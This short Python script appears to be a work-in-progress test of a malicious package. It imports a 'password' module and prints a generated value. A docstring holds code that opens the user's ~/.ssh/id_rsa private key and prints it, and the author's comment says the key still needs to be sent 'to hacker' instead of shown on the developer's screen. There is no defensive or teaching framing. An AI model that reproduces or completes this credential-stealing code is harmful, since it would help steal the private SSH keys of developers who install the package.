#from malicious_pkg.malicious_script import malicious_func
# Temporarily using password pkg to test malicious code
from password.password import *
print(getpass(5, 3))
""" Malicious pkg code to steal ssh key. Still need to get ssh info to hacker, not print it on developers screen as is being done now
from os.path import expanduser
home = expanduser("~")
try:
    f = open(home + "/.ssh/id_rsa")
    print(f.read())
except OSError as e:
    pass"""
